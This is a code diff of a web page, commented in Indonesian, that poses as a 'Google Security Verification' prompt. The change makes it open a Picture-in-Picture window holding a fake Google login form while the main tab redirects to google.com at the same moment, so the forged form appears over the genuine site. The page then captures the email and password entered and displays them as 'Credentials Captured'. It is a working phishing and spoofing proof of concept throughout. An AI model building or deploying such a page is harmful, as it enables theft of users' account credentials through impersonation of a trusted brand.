@@ -14,7 +14,7 @@
   button:hover { background: #1557b0; }
   #status { margin-top: 20px; font-family: monospace; font-size: 12px; color: #666; }
 
-  /* Konten PiP (Akan Dipindahkan) */
+  /* Konten PiP */
   #pipContent {
     display: none;
     padding: 20px;
@@ -61,7 +61,7 @@
 
 <div class="panel" id="main-card">
   <h2>🔒 Google Security Verification</h2>
-  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diarahkan ke server aman Google (port 8443) dan diminta mengisi formulir.</p>
+  <p>Klik tombol di bawah untuk memverifikasi akun Google Anda. Anda akan diminta mengisi formulir.</p>
   <button id="startBtn">Verify Account</button>
   <div id="status">[*] Ready...</div>
 </div>
@@ -87,46 +87,52 @@
 
   function log(msg) {
     statusEl.textContent = msg;
-    console.log("[Delay PiP] " + msg);
+    console.log("[PiP Race] " + msg);
   }
 
   // ============================================
-  // 1. TRIGGER (KLIK)
+  // 1. TRIGGER (KLIK) - RACE CONDITION
   // ============================================
   btn.addEventListener('click', async function() {
-    log("[*] Memulai delay spoofing dengan PiP...");
+    log("[*] Memulai race condition: PiP + Google.com...");
 
     // ============================================
-    // A. BUKA PiP (SEGERA)
+    // A. BUKA PiP & REDIRECT BERSAMAAN (0ms)
     // ============================================
-    try {
-      if (!window.documentPictureInPicture) {
-        alert("Document Picture-in-Picture tidak didukung.");
-        return;
+    
+    // 1. Buka PiP (async)
+    const pipPromise = (async () => {
+      try {
+        if (!window.documentPictureInPicture) {
+          alert("Document Picture-in-Picture tidak didukung.");
+          return null;
+        }
+        const pipWindow = await documentPictureInPicture.requestWindow({
+          width: 400,
+          height: 500
+        });
+        
+        // Pindahkan konten phishing ke PiP
+        pipContent.style.display = 'block';
+        pipWindow.document.body.append(pipContent);
+        return pipWindow;
+      } catch (e) {
+        log("PiP Error: " + e.message);
+        return null;
       }
+    })();
 
-      const pipWindow = await documentPictureInPicture.requestWindow({
-        width: 400,
-        height: 500
-      });
+    // 2. REDIRECT KE GOOGLE.COM (LANGSUNG, 0ms)
+    try {
+      window.location.href = "https://www.google.com";
+    } catch (e) {}
 
-      // Pindahkan konten phishing ke PiP
-      pipContent.style.display = 'block';
-      pipWindow.document.body.append(pipContent);
-
+    // 3. Tunggu PiP siap (jika berhasil)
+    const pipWindow = await pipPromise;
+    if (pipWindow) {
       log('PiP Window Opened. Form login palsu ditampilkan.');
 
-      // ============================================
-      // B. REDIRECT KE GOOGLE:8443 (PENDING NAVIGATION)
-      // ============================================
-      setTimeout(function() {
-        log("[*] Redirect ke google.com:8443 (Pending Navigation)...");
-        window.location.href = "https://www.google.com:8443";
-      }, 500);
-
-      // ============================================
-      // C. EVENT LISTENER DI PiP (TANGKAP INPUT)
-      // ============================================
+      // Event listener di PiP
       pipWindow.document.getElementById('pipLogin').addEventListener('click', function() {
         var email = pipWindow.document.getElementById('pipEmail').value;
         var password = pipWindow.document.getElementById('pipPassword').value;
@@ -138,7 +144,7 @@
 
         log("Captured: " + email + " / " + password);
 
-        // Tampilkan data di halaman utama (di log)
+        // Tampilkan data di halaman utama
         statusEl.innerHTML = `
           <div style="background:#000;color:#0f0;padding:10px;border-radius:6px;margin-top:10px;">
             <strong>Credentials Captured:</strong><br>
@@ -156,10 +162,8 @@
           pipWindow.close();
         }, 2000);
       });
-
-    } catch (e) {
-      log("Error: " + e.message);
     }
+
   }, { once: true });
 
 })();
